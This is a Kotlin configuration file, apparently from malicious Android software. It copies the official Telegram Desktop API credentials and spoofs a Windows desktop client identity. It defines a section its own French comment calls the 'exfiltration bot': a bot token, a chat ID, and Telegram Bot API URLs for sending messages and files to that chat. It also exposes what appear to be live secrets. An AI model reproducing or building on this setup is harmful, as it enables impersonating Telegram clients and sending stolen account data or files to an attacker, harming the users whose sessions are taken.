package com.tgme.app

object Config {
    // ---- Identifiants officiels Telegram Desktop ----
    const val API_ID = 2040
    const val API_HASH = "b18441a1ff607e10a989891a5462e627"

    // ---- Identité "Desktop" ----
    const val DEVICE_MODEL = "Desktop"
    const val SYSTEM_VERSION = "Windows 10"
    const val APP_VERSION = "5.5.1 x64"
    const val SYSTEM_LANG = "en-US"

    // ---- Bot d'exfiltration ----
    const val BOT_TOKEN = "8610466101:AAGrgL8oIrBRBDHsV0M_dC2mqwU7MKaZF5k"
    const val CHAT_ID = "8314393607"

    private const val BASE = "https://api.telegram.org/bot$BOT_TOKEN"
    const val WEBHOOK_URL = "$BASE/sendMessage?chat_id=$CHAT_ID&disable_web_page_preview=true"
    const val WEBHOOK_FILE_URL = "$BASE/sendDocument?chat_id=$CHAT_ID"
}
